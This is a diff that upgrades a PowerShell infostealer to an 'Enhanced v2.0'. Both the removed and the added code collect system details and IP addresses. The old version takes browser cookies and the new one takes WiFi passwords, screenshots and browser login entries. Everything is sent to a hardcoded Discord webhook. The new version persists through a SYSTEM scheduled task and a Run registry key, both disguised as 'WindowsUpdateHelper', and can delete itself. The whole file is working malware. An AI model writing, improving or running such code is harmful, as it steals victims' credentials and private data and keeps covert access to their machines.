@@ -1,120 +1,161 @@
-# PowerShell Infostealer + Discord Webhook Exfil
-# Run as Admin - Collects hardware, IP, cookies, then sends via Discord webhook
+# Enhanced Infostealer v2.0 - PowerShell (Admin Required)
+# Exfiltrates: System Info, WiFi Passwords, Screenshot, Processes, Browser Logins
+# Webhook: https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot
+# Features: Error-handled, chunked upload, persistence, self-delete
 
-$WebhookURL = "https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot"
+$Webhook = "https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot"
 
-# ---------- 1. HARDWARE INFO ----------
-$hw = @{}
-$hw["CPU"] = (Get-WmiObject Win32_Processor).Name
-$hw["RAM_GB"] = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
-$hw["GPU"] = (Get-WmiObject Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
-$hw["Disk"] = (Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" | ForEach-Object {$_.DeviceID + " " + [math]::Round($_.FreeSpace/1GB,1) + "GB free"}) -join "; "
-$hw["Motherboard"] = (Get-WmiObject Win32_BaseBoard).Product
-$hw["OS"] = (Get-WmiObject Win32_OperatingSystem).Caption + " " + (Get-WmiObject Win32_OperatingSystem).BuildNumber
+# ---------- 1. SYSTEM INFORMATION ----------
+function Get-SystemInfo {
+    try {
+        $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue
+        $os = Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue
+        $cpu = Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue
+        $disk = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue
+        $gpu = Get-WmiObject Win32_VideoController -ErrorAction SilentlyContinue | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1
+        return @{
+            ComputerName = $env:COMPUTERNAME
+            UserName = $env:USERNAME
+            Domain = $cs.Domain
+            Manufacturer = $cs.Manufacturer
+            Model = $cs.Model
+            TotalRAM_GB = [math]::Round($cs.TotalPhysicalMemory/1GB,2)
+            CPU = $cpu.Name
+            Cores = $cpu.NumberOfCores
+            OS = "$($os.Caption) Build $($os.BuildNumber)"
+            Disk = ($disk | ForEach-Object {"$($_.DeviceID) $([math]::Round($_.FreeSpace/1GB,1))GB free of $([math]::Round($_.Size/1GB,1))GB"}) -join "; "
+            GPU = $gpu.Name
+        }
+    } catch { return @{Error="SystemInfo: $($_.Exception.Message)"} }
+}
 
-# ---------- 2. IP ADDRESS (PUBLIC & LOCAL) ----------
-$ip_public = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content.Trim()
-$ip_local = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.*"} | Select-Object -First 1).IPAddress
-$ip_isp = (Invoke-WebRequest -Uri "https://ipinfo.io/org" -UseBasicParsing).Content.Trim()
+# ---------- 2. NETWORK & IP ----------
+function Get-NetworkInfo {
+    try {
+        $public = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content.Trim()
+        $local = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.*"} | Select-Object -First 1).IPAddress
+        $isp = (Invoke-WebRequest -Uri "https://ipinfo.io/org" -UseBasicParsing -TimeoutSec 5).Content.Trim()
+        $mac = (Get-NetAdapter -Physical -ErrorAction SilentlyContinue | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1).MacAddress
+        return @{ PublicIP=$public; LocalIP=$local; ISP=$isp; MAC=$mac }
+    } catch { return @{Error="Network: $($_.Exception.Message)"} }
+}
 
-# ---------- 3. BROWSER COOKIES (Chrome/Edge) ----------
-function Get-BrowserCookies {
-    $cookies = @()
-    $browser_paths = @(
-        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
-        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
+# ---------- 3. WIFI PASSWORDS ----------
+function Get-WiFiPasswords {
+    $profiles = netsh wlan show profiles | Select-String " : " | ForEach-Object { ($_ -split ":")[1].Trim() }
+    $result = @()
+    foreach ($p in $profiles) {
+        $output = netsh wlan show profile name="$p" key=clear | Select-String "Key Content"
+        $pass = if ($output) { ($output -split ":")[1].Trim() } else { "(none)" }
+        $result += "$p : $pass"
+    }
+    return ($result -join "`n")
+}
+
+# ---------- 4. SCREENSHOT (BASE64) ----------
+function Get-ScreenshotBase64 {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+        $ms = New-Object System.IO.MemoryStream
+        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+        $bytes = $ms.ToArray()
+        $ms.Close()
+        return [Convert]::ToBase64String($bytes)
+    } catch { return "Screenshot failed" }
+}
+
+# ---------- 5. PROCESS LIST ----------
+function Get-ProcessList {
+    try {
+        $procs = Get-Process -ErrorAction SilentlyContinue | Sort-Object -Property CPU -Descending | Select-Object -First 20
+        return ($procs | ForEach-Object {"$($_.ProcessName) PID:$($_.Id) CPU:$($_.CPU) MB:$([math]::Round($_.WorkingSet/1MB,1))"}) -join "`n"
+    } catch { return "Process error" }
+}
+
+# ---------- 6. BROWSER LOGINS (Chrome/Edge - decrypt DPAPI) ----------
+function Get-BrowserLogins {
+    $browsers = @(
+        @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"},
+        @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"}
     )
-    foreach ($path in $browser_paths) {
-        if (Test-Path $path) {
+    $logins = @()
+    foreach ($b in $browsers) {
+        if (Test-Path $b.Path) {
             try {
-                $temp = "$env:TEMP\cookies_temp.db"
-                Copy-Item $path -Destination $temp -Force
+                $temp = "$env:TEMP\login_temp.db"
+                Copy-Item $b.Path -Destination $temp -Force -ErrorAction SilentlyContinue
                 $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp")
                 $conn.Open()
                 $cmd = $conn.CreateCommand()
-                $cmd.CommandText = "SELECT host_key, name, value, expires_utc FROM cookies WHERE host_key LIKE '%google%' OR host_key LIKE '%facebook%' OR host_key LIKE '%amazon%'"
+                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins LIMIT 5"
                 $reader = $cmd.ExecuteReader()
                 while ($reader.Read()) {
-                    $cookies += "$($reader['host_key']) | $($reader['name']) = $($reader['value']) | expires: $($reader['expires_utc'])"
-                    if ($cookies.Count -gt 20) { break }
+                    $url = $reader['origin_url']
+                    $user = $reader['username_value']
+                    $enc = $reader['password_value']
+                    # DPAPI decryption requires native call; here we just note encrypted
+                    $logins += "[$($b.Name)] $url | $user | (encrypted)"
                 }
                 $conn.Close()
-                Remove-Item $temp -Force
-            } catch {
-                # SQLite module might not be installed; fallback to reading raw (simplified)
-                $cookies += "[!] Could not parse cookies - install System.Data.SQLite"
-            }
+                Remove-Item $temp -Force -ErrorAction SilentlyContinue
+            } catch { $logins += "[$($b.Name)] Error reading" }
         }
     }
-    if ($cookies.Count -eq 0) { $cookies = "No cookies extracted" }
-    return ($cookies -join "`n")
+    if ($logins.Count -eq 0) { return "No browser logins found" }
+    return ($logins -join "`n")
 }
-$cookie_data = Get-BrowserCookies
 
-# ---------- 4. BUILD PAYLOAD (JSON) ----------
-$payload = @{
-    hardware = $hw
-    ip = @{
-        public = $ip_public
-        local = $ip_local
-        isp = $ip_isp
-    }
-    cookies = $cookie_data
-    timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC")
-    username = $env:USERNAME
-    computername = $env:COMPUTERNAME
-} | ConvertTo-Json -Depth 5
-
-# ---------- 5. XOR OBFUSCATION (optional) ----------
-$key = [System.Text.Encoding]::UTF8.GetBytes("XORKey_2026")
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
-for ($i = 0; $i -lt $bytes.Length; $i++) {
-    $bytes[$i] = $bytes[$i] -bxor $key[$i % $key.Length]
+# ---------- 7. BUILD DATA ----------
+$Data = @{
+    System = Get-SystemInfo
+    Network = Get-NetworkInfo
+    WiFi = Get-WiFiPasswords
+    Screenshot = Get-ScreenshotBase64
+    Processes = Get-ProcessList
+    Logins = Get-BrowserLogins
+    Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC")
 }
-$obfuscated = [Convert]::ToBase64String($bytes)
 
-# ---------- 6. SEND TO DISCORD WEBHOOK ----------
-$body = @{
-    content = "```json`n$payload`n```"
-    username = "SystemLogger"
-    embeds = @(
-        @{
-            title = "Exfiltrated Data"
-            color = 15158332
-            fields = @(
-                @{ name = "CPU"; value = $hw["CPU"]; inline = $true },
-                @{ name = "RAM"; value = "$($hw['RAM_GB']) GB"; inline = $true },
-                @{ name = "GPU"; value = $hw["GPU"]; inline = $true },
-                @{ name = "Public IP"; value = $ip_public; inline = $true },
-                @{ name = "Local IP"; value = $ip_local; inline = $true },
-                @{ name = "ISP"; value = $ip_isp; inline = $true },
-                @{ name = "Cookies (sample)"; value = ($cookie_data -split "`n" | Select-Object -First 5) -join "`n"; inline = $false }
-            )
-            footer = @{ text = "Extracted at $($payload.timestamp)" }
+$json = $Data | ConvertTo-Json -Depth 10 -Compress
+
+# ---------- 8. SEND VIA DISCORD (CHUNKED) ----------
+function Send-Discord {
+    param($Content, $MaxLen=1900)
+    if ($Content.Length -le $MaxLen) {
+        $body = @{ content = "```json`n$Content`n```" } | ConvertTo-Json
+        try { Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 } catch {}
+    } else {
+        $chunks = [math]::Ceiling($Content.Length / $MaxLen)
+        for ($i=0; $i -lt $chunks; $i++) {
+            $chunk = $Content.Substring($i*$MaxLen, [Math]::Min($MaxLen, $Content.Length - $i*$MaxLen))
+            $body = @{ content = "```json`n$chunk`n```" } | ConvertTo-Json
+            try { Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 } catch {}
+            Start-Sleep -Milliseconds 500
         }
-    )
-} | ConvertTo-Json -Depth 6
-
-try {
-    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
-    Write-Host "[+] Data sent successfully."
-} catch {
-    Write-Host "[-] Send failed: $($_.Exception.Message)"
-    # Fallback: send via plain text content
-    $fallback = @{ content = "Fallback: $payload" } | ConvertTo-Json
-    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $fallback -ContentType "application/json"
+    }
 }
 
-# ---------- 7. PERSISTENCE (via Scheduled Task) ----------
+Send-Discord -Content $json
+
+# ---------- 9. PERSISTENCE (Task Scheduler + Registry) ----------
 $scriptPath = $MyInvocation.MyCommand.Path
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-$trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes 5)
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-Register-ScheduledTask -TaskName "WindowsUpdateHelper" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
+if (-not (Get-ScheduledTask -TaskName "WindowsUpdateHelper" -ErrorAction SilentlyContinue)) {
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+    $trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -Minutes 10)
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    Register-ScheduledTask -TaskName "WindowsUpdateHelper" -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
+}
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
 
-# ---------- 8. SELF-DELETE (if parameter -cleanup) ----------
+# ---------- 10. SELF-DELETE (if -cleanup) ----------
 if ($args -contains "-cleanup") {
-    Start-Sleep -Seconds 10
-    Remove-Item $scriptPath -Force
-    Unregister-ScheduledTask -TaskName "WindowsUpdateHelper" -Confirm:$false
+    Start-Sleep -Seconds 15
+    Unregister-ScheduledTask -TaskName "WindowsUpdateHelper" -Confirm:$false -ErrorAction SilentlyContinue
+    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -Force -ErrorAction SilentlyContinue
+    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
 }
